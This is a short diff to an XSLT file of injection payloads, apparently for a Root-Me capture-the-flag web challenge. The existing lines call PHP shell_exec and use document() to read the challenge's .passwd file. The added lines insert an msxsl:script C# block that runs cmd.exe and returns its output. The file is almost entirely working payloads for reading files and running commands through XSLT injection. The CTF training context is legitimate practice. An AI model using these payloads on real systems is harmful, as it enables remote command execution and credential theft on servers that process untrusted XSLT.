@@ -7,6 +7,20 @@
 	<xsl:value-of select="php:function('shell_exec', 'ls')" />
 	<xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/.passwd')"/>
 	<xsl:value-of select="document('http://challenge01.root-me.org/web-serveur/ch50/.passwd')"/>
+	<msxsl:script language = "C#" implements-prefix = "user">
+<![CDATA[
+public string execute(){
+System.Diagnostics.Process proc = new System.Diagnostics.Process();
+proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";
+proc.StartInfo.RedirectStandardOutput = true;
+proc.StartInfo.UseShellExecute = false;
+proc.StartInfo.Arguments = "/c dir";
+proc.Start();
+proc.WaitForExit();
+return proc.StandardOutput.ReadToEnd();
+}
+]]>
+</msxsl:script>
     </p>
 </body>
 </html> 
